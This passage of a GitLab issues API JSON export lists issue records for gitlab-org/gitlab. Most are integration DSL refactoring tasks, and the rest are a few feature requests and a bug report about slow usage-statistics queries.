Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354198","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354198","notes":"https://gitlab.com/api/v4/projects/278964/issues/354198/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354198/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354198","relative":"#354198","full":"gitlab-org/gitlab#354198"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7652,"epic":{"id":454800,"iid":7652,"title":"Integrations Static DSL","url":"/groups/gitlab-org/-/epics/7652","group_id":9970},"iteration":null,"health_status":null},{"id":103981906,"iid":354194,"project_id":278964,"title":"Static Integration DSL: app/models/integrations/microsoft_teams.rb","description":"Convert app/models/integrations/microsoft_teams.rb to use the static field DSL introduced","state":"closed","created_at":"2022-03-02T18:11:18.752Z","updated_at":"2022-12-13T22:33:37.944Z","closed_at":"2022-12-13T22:33:37.931Z","closed_by":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"labels":["Category:Integrations","[deprecated] Accepting merge requests","backend","devops::manage","group::integrations","section::dev","type::maintenance","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354194","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354194","notes":"https://gitlab.com/api/v4/projects/278964/issues/354194/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354194/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354194","relative":"#354194","full":"gitlab-org/gitlab#354194"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7652,"epic":{"id":454800,"iid":7652,"title":"Integrations Static DSL","url":"/groups/gitlab-org/-/epics/7652","group_id":9970},"iteration":null,"health_status":null},{"id":103981903,"iid":354193,"project_id":278964,"title":"Static Integration DSL: app/models/integrations/datadog.rb","description":"Convert app/models/integrations/datadog.rb to use the static field DSL introduced","state":"closed","created_at":"2022-03-02T18:11:15.178Z","updated_at":"2022-11-22T18:58:34.754Z","closed_at":"2022-10-17T10:34:32.940Z","closed_by":{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"},"labels":["Category:Integrations","backend","blocked","devops::manage","group::integrations","missed:15.2","missed:15.3","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"}],"author":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"type":"ISSUE","assignee":{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354193","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354193","notes":"https://gitlab.com/api/v4/projects/278964/issues/354193/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354193/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354193","relative":"#354193","full":"gitlab-org/gitlab#354193"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7652,"epic":{"id":454800,"iid":7652,"title":"Integrations Static DSL","url":"/groups/gitlab-org/-/epics/7652","group_id":9970},"iteration":null,"health_status":null},{"id":103981885,"iid":354189,"project_id":278964,"title":"Static Integration DSL: app/models/integrations/mattermost.rb","description":"Convert app/models/integrations/mattermost.rb to use the static field DSL introduced","state":"closed","created_at":"2022-03-02T18:10:49.188Z","updated_at":"2022-12-13T22:33:37.764Z","closed_at":"2022-12-13T22:33:37.751Z","closed_by":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"labels":["Category:Integrations","[deprecated] Accepting merge requests","backend","devops::manage","group::integrations","section::dev","type::maintenance","workflow::ready for development"],"milestone":{"id":2745650,"iid":84,"group_id":9970,"title":"15.9","description":"","state":"active","created_at":"2022-08-22T16:58:02.303Z","updated_at":"2022-08-22T16:58:02.303Z","due_date":"2023-02-17","start_date":"2023-01-18","expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/84"},"assignees":[],"author":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"type":"ISSUE","assignee":null,"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354189","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354189","notes":"https://gitlab.com/api/v4/projects/278964/issues/354189/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354189/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354189","relative":"#354189","full":"gitlab-org/gitlab#354189"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7652,"epic":{"id":454800,"iid":7652,"title":"Integrations Static DSL","url":"/groups/gitlab-org/-/epics/7652","group_id":9970},"iteration":null,"health_status":null},{"id":103981876,"iid":354187,"project_id":278964,"title":"Static Integration DSL: app/models/integrations/webex_teams.rb","description":"Convert app/models/integrations/webex_teams.rb to use the static field DSL introduced","state":"closed","created_at":"2022-03-02T18:10:38.667Z","updated_at":"2022-12-13T22:33:37.575Z","closed_at":"2022-12-13T22:33:37.563Z","closed_by":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"labels":["Category:Integrations","[deprecated] Accepting merge requests","backend","devops::manage","group::integrations","section::dev","type::maintenance","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354187","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354187","notes":"https://gitlab.com/api/v4/projects/278964/issues/354187/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354187/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354187","relative":"#354187","full":"gitlab-org/gitlab#354187"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7652,"epic":{"id":454800,"iid":7652,"title":"Integrations Static DSL","url":"/groups/gitlab-org/-/epics/7652","group_id":9970},"iteration":null,"health_status":null},{"id":103981863,"iid":354185,"project_id":278964,"title":"Static Integration DSL: app/models/integrations/slack_slash_commands.rb, app/models/integrations/mattermost_slash_commands.rb","description":"Convert app/models/integrations/slack_slash_commands.rb and app/models/integrations/mattermost_slash_commands.rb to use the static field DSL introduced","state":"closed","created_at":"2022-03-02T18:10:03.762Z","updated_at":"2022-12-13T22:33:37.367Z","closed_at":"2022-12-13T22:33:37.356Z","closed_by":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"labels":["Category:Integrations","backend","devops::manage","group::integrations","section::dev","type::maintenance","workflow::in dev"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354185","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354185","notes":"https://gitlab.com/api/v4/projects/278964/issues/354185/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354185/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354185","relative":"#354185","full":"gitlab-org/gitlab#354185"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7652,"epic":{"id":454800,"iid":7652,"title":"Integrations Static DSL","url":"/groups/gitlab-org/-/epics/7652","group_id":9970},"iteration":null,"health_status":null},{"id":103981848,"iid":354182,"project_id":278964,"title":"Static Integration DSL: app/models/integrations/discord.rb","description":"Convert app/models/integrations/discord.rb to use the static field DSL introduced","state":"closed","created_at":"2022-03-02T18:09:42.855Z","updated_at":"2022-11-22T18:58:41.870Z","closed_at":"2022-09-23T11:49:01.303Z","closed_by":{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"},"labels":["Deliverable","backend","devops::manage","group::integrations","maintenance::refactor","missed-deliverable","missed:15.4","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"}],"author":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"type":"ISSUE","assignee":{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354182","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354182","notes":"https://gitlab.com/api/v4/projects/278964/issues/354182/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354182/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354182","relative":"#354182","full":"gitlab-org/gitlab#354182"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7652,"epic":{"id":454800,"iid":7652,"title":"Integrations Static DSL","url":"/groups/gitlab-org/-/epics/7652","group_id":9970},"iteration":null,"health_status":null},{"id":103981779,"iid":354170,"project_id":278964,"title":"Static Integration DSL: app/models/integrations/hangouts_chat.rb","description":"Convert app/models/integrations/hangouts_chat.rb to use the static field DSL introduced","state":"closed","created_at":"2022-03-02T18:08:36.219Z","updated_at":"2022-12-13T22:33:37.114Z","closed_at":"2022-12-13T22:33:37.091Z","closed_by":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"labels":["Category:Integrations","[deprecated] Accepting merge requests","backend","devops::manage","group::integrations","section::dev","type::maintenance","workflow::ready for development"],"milestone":{"id":2745650,"iid":84,"group_id":9970,"title":"15.9","description":"","state":"active","created_at":"2022-08-22T16:58:02.303Z","updated_at":"2022-08-22T16:58:02.303Z","due_date":"2023-02-17","start_date":"2023-01-18","expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/84"},"assignees":[],"author":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"type":"ISSUE","assignee":null,"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354170","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354170","notes":"https://gitlab.com/api/v4/projects/278964/issues/354170/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354170/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354170","relative":"#354170","full":"gitlab-org/gitlab#354170"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7652,"epic":{"id":454800,"iid":7652,"title":"Integrations Static DSL","url":"/groups/gitlab-org/-/epics/7652","group_id":9970},"iteration":null,"health_status":null},{"id":103980050,"iid":354162,"project_id":278964,"title":"Add Analytics -\u003e CI/CD to User Settings for Shared Runner Duration tracking","description":"## Problem\n\nUsers [are reporting](https://gitlab.com/gitlab-org/gitlab/-/issues/243722#note_845366769) that they cannot access `Analytics \u003e Shared runners duration` page on a group on Free plan. The whole `Analytics` menu item on the left side-bar is hidden.\n\n![image](/uploads/5c798fdb28984a79690261b885bd6606/image.png)\n\nThis could be because the `Analytics` is a paid feature and we placed this information in there.\n\n## Solution\n\n* Allow `Analytics` button to show and make only the `Shared runners duration` tab visible for all users (Free+ plan). Hide other tabs if they are paid features.\n* Remove the Graphs from Usage Quota that was a quick fix in #353062+\n* Add a link to Usage Quota to direct users where Shared Runner duration is tracked.","state":"closed","created_at":"2022-03-02T17:38:40.602Z","updated_at":"2022-04-12T22:37:45.798Z","closed_at":"2022-03-11T14:16:19.841Z","closed_by":{"id":6115425,"username":"v_mishra","name":"Veethika M","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f09a3a0badac17a57e28b4e18a45c1c0?s=80\u0026d=identicon","web_url":"https://gitlab.com/v_mishra"},"labels":["Category:Continuous Integration","SUS::Impacting","UX","Verify::P1","[deprecated] Accepting merge requests","automation:ux-missing-labels","devops::verify","feature::enhancement","frontend","group::pipeline execution","section::ops","type::feature","workflow::ready for development"],"milestone":null,"assignees":[],"author":{"id":4512666,"username":"jheimbuck_gl","name":"James Heimbuck","state":"active","avatar_url":"https://secure.gravatar.com/avatar/8dd2ef9c1cacb6e80d7ca47db6f0ce22?s=80\u0026d=identicon","web_url":"https://gitlab.com/jheimbuck_gl"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354162","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354162","notes":"https://gitlab.com/api/v4/projects/278964/issues/354162/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354162/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354162","relative":"#354162","full":"gitlab-org/gitlab#354162"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7561,"epic":{"id":442014,"iid":7561,"title":"CI minutes and Runner Duration Visibility Charts MVC","url":"/groups/gitlab-org/-/epics/7561","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":103971359,"iid":354140,"project_id":278964,"title":"Display a button linking to the security policy project for non-owners","description":"\u003c!-- This issue template can be used as a great starting point for feature requests. The section \"Release notes\" can be used as a summary of the feature and is also required if you want to have your release post blog MR auto generated using the release post item generator:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator. The remaining sections are the backbone for every feature in GitLab.\n\nThe goal of this template is brevity for quick/smaller iterations. For a more thorough list of considerations for larger features or feature sets, you can leverage the detailed [feature proposal](https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Feature%20proposal%20-%20detailed.md). --\u003e\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem to solve\n\n\u003c!-- What is the user problem you are trying to solve with this issue? --\u003e\nUsers who are not project owners have no way of identifying which security policy project is linked to their development project.\n\n### Proposal\n\n\u003c!-- Use this section to explain the feature and how it will work. It can be helpful to add technical details, design proposals, and links to related epics or issues. --\u003e\n1. Users who are not project owners will see a button on the **Security \u0026 Compliance \u003e Policies** page that links to the associated security policy project.  This button will only be visible if a security policy project is linked, otherwise no button will be displayed.\n2. No button will be displayed for projects that do not have a linked security policy project.\n\n### Design\n\n![image](/uploads/f932ac596b37a753fa957599e050ccf6/image.png)\n\n### Intended users\n\n\u003c!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager)\n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops)\n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n* [Eddie (Content Editor)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#eddie-content-editor)\n\n--\u003e\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n\n### Feature Usage Metrics\n\n\u003c!-- How are you going to track usage of this feature? Think about user behavior and their interaction with the product. What indicates someone is getting value from it?\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n\n--\u003e\n\n\u003c!-- Label reminders\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e\n\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2022-03-02T15:11:41.343Z","updated_at":"2022-03-14T20:29:12.483Z","closed_at":"2022-03-14T20:29:12.439Z","closed_by":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"labels":["Category:Security Policy Management","Enterprise Edition","GitLab Ultimate","devops::govern","direction","documentation","frontend","frontend-weight::2","group::security policies","section::sec","type::feature","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"}],"author":{"id":5292351,"username":"sam.white","name":"Sam White","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d467fb024d1858d279e6a36e028436ac?s=80\u0026d=identicon","web_url":"https://gitlab.com/sam.white"},"type":"ISSUE","assignee":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354140","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354140","notes":"https://gitlab.com/api/v4/projects/278964/issues/354140/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354140/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354140","relative":"#354140","full":"gitlab-org/gitlab#354140"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6611,"epic":{"id":332582,"iid":6611,"title":"Follow-on Improvements for the Security Policy Editor","url":"/groups/gitlab-org/-/epics/6611","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":103971303,"iid":354139,"project_id":278964,"title":"Generating Usage Statistics timing out on queries to ci_builds","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nUsers are getting timeout errors when trying to generate JSON `UsageData` to populate the Usage Statistics page.\n\nWhen triggering the ping refresh via the Rails console, we can see that several `COUNT` queries are made to the `ci_builds` table, taking anywhere from a couple of seconds to several minutes:\n\n```\n(56457.5ms)  SELECT COUNT(DISTINCT \"ci_builds\".\"user_id\") FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"user_id\" \u003e= 1 AND \"ci_builds\".\"user_id\" \u003c 3659\n```\n\nThe actual row count doesn't seem too impressive to justify the problem: \n\n```\ngitlabhq_production=# SELECT COUNT(DISTINCT \"ci_builds\".\"user_id\") FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build';\ncount\n-------\n1471\n(1 row)\n```\n\n### Steps to reproduce\n\nUnsure yet what the necessary elements are to trigger the issue.\n\n### Example Project\n\nTBD\n\n### What is the current *bug* behavior?\n\nThe URL https://gitlab.xxxxx/admin/application_settings/usage_data.json fails, throwing a `502` error.\n\n- The UI Request: Admin / Settings / Metrics and profiling / Usage statistics / \"Preview payload\" returns \"Error fetching payload data. \"\n\nRunning the command via Rails console eventually works, but can take several hours.\n\n### What is the expected *correct* behavior?\n\nThese queues should be optimized to run faster -- usage ping generation should not time out.\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. 